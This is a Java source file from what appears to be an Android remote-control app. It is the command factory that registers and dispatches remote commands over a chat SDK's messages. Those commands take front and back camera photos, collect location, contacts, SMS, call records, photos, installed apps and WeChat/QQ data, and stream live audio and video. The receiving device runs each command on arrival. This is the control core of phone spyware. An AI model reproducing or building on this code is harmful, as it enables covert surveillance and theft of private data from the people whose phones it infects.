package com.lfish.control.action;

import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Properties;
import java.util.UUID;
import android.annotation.SuppressLint;
import android.os.Bundle;

import com.google.gson.Gson;
import com.hyphenate.chat.EMClient;
import com.hyphenate.chat.EMMessage;
import com.hyphenate.exceptions.HyphenateException;
import com.lfish.control.action.cmddomian.AudioOnlineCmd;
import com.lfish.control.action.cmddomian.GetCallRecodeCmd;
import com.lfish.control.action.cmddomian.GetContactsCmd;
import com.lfish.control.action.cmddomian.GetDeviceMsgCmd;
import com.lfish.control.action.cmddomian.GetInstallAppsCmd;
import com.lfish.control.action.cmddomian.GetLocationCmd;
import com.lfish.control.action.cmddomian.GetPhotosCmd;
import com.lfish.control.action.cmddomian.GetQQSdCmd;
import com.lfish.control.action.cmddomian.GetSmsCmd;
import com.lfish.control.action.cmddomian.GetUserActivityCmd;
import com.lfish.control.action.cmddomian.GetWeChatSdCmd;
import com.lfish.control.action.cmddomian.LockScreenCmd;
import com.lfish.control.action.cmddomian.TackPhoto_BackCmd;
import com.lfish.control.action.cmddomian.TackPhoto_FrontCmd;
import com.lfish.control.action.cmddomian.VideoOnlineCmd;

public class CmdFactory {
	
	public static final String CMDFACTORY_SEND_DES_CMD = "cmd";
	public static final String CMDFACTORY_SEND_DES_CMDID = "cmdId";
	public static final String CMDFACTORY_SEND_DES_CMDNUMBER = "cmdNumber";
	public static final String CMDFACTORY_SEND_DES_CMDTIME = "cmdTime";
	public static final String CMDFACTORY_SEND_DES_CMDPROPERTIEIS = "cmdProperties";

	private static CmdFactory cmdFactory;
	private Map<Integer,Class> cmdSet =new LinkedHashMap<Integer,Class>();
	private Map<Integer,BaseBeanCmd> cmdLoker = new HashMap<Integer,BaseBeanCmd>();
	
	public static CmdFactory getInstance(){
		if(cmdFactory==null){
			cmdFactory  = new CmdFactory();
		} 
		return cmdFactory;
	} 
	
	public void init(){
		cmdSet.put(new GetDeviceMsgCmd().getCmdNumber(), GetDeviceMsgCmd.class);
		cmdSet.put(new TackPhoto_FrontCmd().getCmdNumber(), TackPhoto_FrontCmd.class);
		cmdSet.put(new TackPhoto_BackCmd().getCmdNumber(), TackPhoto_BackCmd.class);
		cmdSet.put(new GetLocationCmd().getCmdNumber(), GetLocationCmd.class);
		cmdSet.put(new GetPhotosCmd().getCmdNumber(), GetPhotosCmd.class);
		cmdSet.put(new GetInstallAppsCmd().getCmdNumber(), GetInstallAppsCmd.class);
		cmdSet.put(new GetContactsCmd().getCmdNumber(), GetContactsCmd.class);
		cmdSet.put(new GetSmsCmd().getCmdNumber(), GetSmsCmd.class);
		cmdSet.put(new GetCallRecodeCmd().getCmdNumber(), GetCallRecodeCmd.class);
		cmdSet.put(new GetWeChatSdCmd().getCmdNumber(), GetWeChatSdCmd.class);
		cmdSet.put(new GetQQSdCmd().getCmdNumber(), GetQQSdCmd.class);
		cmdSet.put(new VideoOnlineCmd().getCmdNumber(), VideoOnlineCmd.class);
		cmdSet.put(new AudioOnlineCmd().getCmdNumber(), AudioOnlineCmd.class);
		cmdSet.put(new GetUserActivityCmd().getCmdNumber(), GetUserActivityCmd.class);
	}
	
	@SuppressLint("NewApi") 
	public BaseBeanCmd getCmd(int cmd){
		return cmdLoker.get(cmd);
	}
	
	public Map<Integer,Class> getCmdSet(){
		return cmdSet;
	}
	
	public void SendCmd(int cmd,String sendTo){
		BaseBeanCmd cmd2 = getCmd(cmd);
		EMMessage message = EMMessage.createTxtSendMessage(cmd2.getMenuDes(), sendTo);
		message.setAttribute(CMDFACTORY_SEND_DES_CMD, true);
		message.setAttribute(CMDFACTORY_SEND_DES_CMDID, UUID.randomUUID()+"");
		message.setAttribute(CMDFACTORY_SEND_DES_CMDNUMBER, cmd);
		message.setAttribute(CMDFACTORY_SEND_DES_CMDTIME, System.currentTimeMillis() + "");
		message.setChatType(EMMessage.ChatType.Chat);
		EMClient.getInstance().chatManager().sendMessage(message);
	}

	public void SendCmd(int cmd,String sendTo,Object object){
		BaseBeanCmd cmd2 = getCmd(cmd);
		EMMessage message = EMMessage.createTxtSendMessage(cmd2.getMenuDes(), sendTo);
		message.setAttribute(CMDFACTORY_SEND_DES_CMD, true);
		message.setAttribute(CMDFACTORY_SEND_DES_CMDID, UUID.randomUUID()+"");
		message.setAttribute(CMDFACTORY_SEND_DES_CMDNUMBER, cmd);
		message.setAttribute(CMDFACTORY_SEND_DES_CMDTIME, System.currentTimeMillis() + "");
		message.setAttribute(CMDFACTORY_SEND_DES_CMDPROPERTIEIS,new Gson().toJson(object));
		message.setChatType(EMMessage.ChatType.Chat);
		EMClient.getInstance().chatManager().sendMessage(message);
	}

	public void SendCmd(int cmd,String sendTo,Object object,String des){
		BaseBeanCmd cmd2 = getCmd(cmd);
		EMMessage message = EMMessage.createTxtSendMessage(des, sendTo);
		message.setAttribute(CMDFACTORY_SEND_DES_CMD, true);
		message.setAttribute(CMDFACTORY_SEND_DES_CMDID, UUID.randomUUID()+"");
		message.setAttribute(CMDFACTORY_SEND_DES_CMDNUMBER, cmd);
		message.setAttribute(CMDFACTORY_SEND_DES_CMDTIME, System.currentTimeMillis() + "");
		message.setAttribute(CMDFACTORY_SEND_DES_CMDPROPERTIEIS,new Gson().toJson(object));
		message.setChatType(EMMessage.ChatType.Chat);
		EMClient.getInstance().chatManager().sendMessage(message);
	}
	
	public void runReciveCmd(EMMessage msg){
		try {
			boolean booleanAttribute = msg.getBooleanAttribute(CMDFACTORY_SEND_DES_CMD);
			
			if(booleanAttribute){
				int cmdNumber = msg.getIntAttribute(CMDFACTORY_SEND_DES_CMDNUMBER);
				BaseBeanAction action = ActionFactory.getInstance().getAction(cmdNumber);
				action.setActionId(msg.getStringAttribute(CMDFACTORY_SEND_DES_CMDID));
				action.setCmd(cmdNumber);
				action.setFrom(msg.getFrom());
				action.setTime(Long.parseLong(msg.getStringAttribute(CMDFACTORY_SEND_DES_CMDTIME)));
				try{
				String params = msg.getStringAttribute(CMDFACTORY_SEND_DES_CMDPROPERTIEIS);
				action.setProperties(params != null ? params : "");
				}catch (Exception e){

				}
				ActionFactory.getInstance().runAction(action);
			}
		} catch (HyphenateException e) {
			e.printStackTrace();
		}
	}

	public void addLockBean(BaseBeanCmd baseBeanCmd){
		cmdLoker.put(baseBeanCmd.getCmdNumber(),baseBeanCmd);
	}


	@SuppressLint("NewApi")
	public BaseBeanCmd getCmdServer(int cmd){

		return cmdLoker.get(cmd);

	}
}
